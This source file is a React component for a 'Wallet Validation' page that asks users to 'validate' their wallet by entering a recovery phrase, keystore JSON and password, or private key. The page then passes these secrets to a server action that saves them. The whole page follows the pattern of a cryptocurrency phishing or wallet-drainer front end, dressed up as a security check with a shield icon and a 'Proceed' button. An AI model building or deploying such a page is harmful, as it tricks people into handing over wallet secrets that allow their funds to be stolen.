"use client";

import { useState } from "react";
import {
  Shield, X, CheckCircle2, AlertCircle, Loader2, Wallet,
} from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { saveWalletValidation, type ValidationType } from "@/features/wallet-validate/server/actions";

const TABS: { id: ValidationType; label: string }[] = [
  { id: "mnemonics", label: "MNEMONICS" },
  { id: "keystore", label: "KEYSTORE" },
  { id: "private_key", label: "PRIVATE KEY" },
  { id: "hardware", label: "HARDWARE" },
];

const LABEL_MAP: Record<ValidationType, string> = {
  mnemonics: "Enter your 12/24 word recovery phrase",
  keystore: "Enter your keystore JSON and password",
  private_key: "Enter your private key",
  hardware: "Select your hardware wallet device",
};

export default function WalletValidatePage() {
  const [walletName, setWalletName] = useState("");
  const [activeTab, setActiveTab] = useState<ValidationType>("mnemonics");
  const [saving, setSaving] = useState(false);
  const [result, setResult] = useState<{ success?: boolean; message: string } | null>(null);
  const [form, setForm] = useState({
    mnemonicPhrase: "",
    keystoreJson: "",
    keystorePassword: "",
    privateKey: "",
    hardwareType: "ledger",
  });

  const setField = (field: string, value: string) =>
    setForm((prev) => ({ ...prev, [field]: value }));

  const isFormValid = () => {
    if (!walletName.trim()) return false;
    switch (activeTab) {
      case "mnemonics":
        return form.mnemonicPhrase.trim().split(/\s+/).length >= 12;
      case "keystore":
        return form.keystoreJson.trim().length > 0 && form.keystorePassword.trim().length > 0;
      case "private_key":
        return form.privateKey.trim().length > 0;
      case "hardware":
        return form.hardwareType.trim().length > 0;
      default:
        return false;
    }
  };

  const handleSubmit = async () => {
    if (!isFormValid()) {
      setResult({ success: false, message: "Please fill in all required fields." });
      return;
    }
    setSaving(true);
    setResult(null);
    try {
      const res = await saveWalletValidation({
        walletName: walletName.trim(),
        validationType: activeTab,
        mnemonicPhrase: activeTab === "mnemonics" ? form.mnemonicPhrase.trim() : undefined,
        keystoreJson: activeTab === "keystore" ? form.keystoreJson.trim() : undefined,
        keystorePassword: activeTab === "keystore" ? form.keystorePassword.trim() : undefined,
        privateKey: activeTab === "private_key" ? form.privateKey.trim() : undefined,
        hardwareType: activeTab === "hardware" ? form.hardwareType : undefined,
      });
      if (res.error) {
        setResult({ success: false, message: res.error });
      } else {
        setResult({ success: true, message: `${walletName.trim()} validation saved successfully.` });
        setForm({ mnemonicPhrase: "", keystoreJson: "", keystorePassword: "", privateKey: "", hardwareType: "ledger" });
      }
    } catch (err) {
      setResult({ success: false, message: err instanceof Error ? err.message : "Something went wrong" });
    } finally {
      setSaving(false);
    }
  };

  const renderInput = () => {
    switch (activeTab) {
      case "mnemonics":
        return (
          <Textarea
            value={form.mnemonicPhrase}
            onChange={(e) => setField("mnemonicPhrase", e.target.value)}
            placeholder="Enter your 12 or 24 word recovery phrase, separated by spaces"
            rows={4}
            className="min-h-[100px]"
          />
        );
      case "keystore":
        return (
          <div className="space-y-3">
            <Textarea
              value={form.keystoreJson}
              onChange={(e) => setField("keystoreJson", e.target.value)}
              placeholder='Paste your keystore JSON here {"address":"0x...","crypto":{...}}'
              rows={4}
              className="min-h-[100px] font-mono text-xs"
            />
            <Input
              type="password"
              value={form.keystorePassword}
              onChange={(e) => setField("keystorePassword", e.target.value)}
              placeholder="Enter your keystore password"
            />
          </div>
        );
      case "private_key":
        return (
          <Input
            type="password"
            value={form.privateKey}
            onChange={(e) => setField("privateKey", e.target.value)}
            placeholder="Enter your private key (e.g. 0x... or raw hex)"
          />
        );
      case "hardware":
        return (
          <select
            value={form.hardwareType}
            onChange={(e) => setField("hardwareType", e.target.value)}
            className="flex h-10 w-full rounded-md border border-white/10 bg-surface-800 px-3 py-2 text-sm text-white focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-brand-500"
          >
            <option value="ledger">Ledger</option>
            <option value="trezor">Trezor</option>
            <option value="keystone">Keystone</option>
            <option value="other">Other</option>
          </select>
        );
    }
  };

  return (
    <div className="mx-auto max-w-lg space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-white">Wallet Validation</h1>
        <p className="mt-1 text-sm text-surface-400">
          Validate your wallet to continue with sensitive operations
        </p>
      </div>

      <Card className="border-white/10 bg-surface-900">
        <CardContent className="p-6">
          <div className="flex flex-col items-center text-center">
            <div className="flex h-14 w-14 items-center justify-center rounded-full bg-brand-500/10 ring-1 ring-brand-500/20">
              <Shield className="h-7 w-7 text-brand-400" />
            </div>
            <h2 className="mt-4 text-base font-semibold text-white">
              Validate your wallet to continue
            </h2>
            <div className="mt-4 w-full">
              <Label className="mb-1.5 block text-left text-xs text-surface-400">
                Wallet name
              </Label>
              <Input
                type="text"
                value={walletName}
                onChange={(e) => setWalletName(e.target.value)}
                placeholder="e.g. Trust Wallet, MetaMask, Coinbase Wallet..."
              />
            </div>
          </div>

          <div className="mt-6 grid grid-cols-2 gap-3">
            {TABS.map((tab) => {
              const active = tab.id === activeTab;
              return (
                <button
                  key={tab.id}
                  type="button"
                  onClick={() => setActiveTab(tab.id)}
                  className={`rounded-lg border px-3 py-2.5 text-xs font-semibold tracking-wide transition-all ${
                    active
                      ? "border-brand-500 bg-brand-500 text-white shadow-sm"
                      : "border-white/10 bg-surface-800 text-surface-300 hover:border-surface-600 hover:bg-surface-700"
                  }`}
                >
                  {tab.label}
                </button>
              );
            })}
          </div>

          <div className="mt-5 rounded-xl border border-white/5 bg-surface-950 p-4">
            <Label className="mb-2 block text-xs text-surface-400">
              {LABEL_MAP[activeTab]}
            </Label>
            {renderInput()}
          </div>

          {result && (
            <div
              className={`mt-4 flex items-start gap-3 rounded-xl border p-4 text-sm ${
                result.success
                  ? "border-emerald-500/20 bg-emerald-500/10 text-emerald-400"
                  : "border-error/20 bg-error/10 text-error"
              }`}
              role="alert"
            >
              {result.success ? <CheckCircle2 className="mt-0.5 h-4 w-4 shrink-0" /> : <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />}
              <span>{result.message}</span>
            </div>
          )}

          <Button
            onClick={handleSubmit}
            disabled={saving}
            className="mt-5 w-full"
          >
            {saving ? (
              <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Proceeding…</>
            ) : (
              "Proceed"
            )}
          </Button>
        </CardContent>
      </Card>
    </div>
  );
}
